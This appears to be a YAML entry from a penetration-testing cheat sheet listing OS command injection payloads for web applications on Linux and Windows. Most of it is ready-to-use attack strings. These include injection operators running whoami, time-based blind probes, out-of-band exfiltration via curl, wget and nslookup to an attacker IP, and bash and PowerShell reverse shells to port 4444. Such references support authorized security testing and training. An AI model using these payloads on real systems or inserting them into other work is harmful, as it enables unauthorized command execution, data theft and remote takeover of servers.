---
description: |
  OS command injection payloads for web applications. Test various
  injection operators and techniques.

  Reference values:
    Attacker IP: 10.10.14.1
command: |
  # Common injection operators
  ; whoami
  | whoami
  || whoami
  & whoami
  && whoami
  $(whoami)
  `whoami`
  %0a whoami

  # Blind command injection (time-based)
  ; sleep 10
  | sleep 10
  & ping -c 10 127.0.0.1 &

  # Blind command injection (out-of-band)
  ; curl http://10.10.14.1/$(whoami)
  ; wget http://10.10.14.1/$(id|base64)
  ; nslookup $(whoami).10.10.14.1

  # Reverse shell via injection
  ;bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
  |powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444)..."
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
items:
  - No_Creds
techniques:
  - Web_Injection
network_position:
  - External
  - Internal
references:
  - https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
---
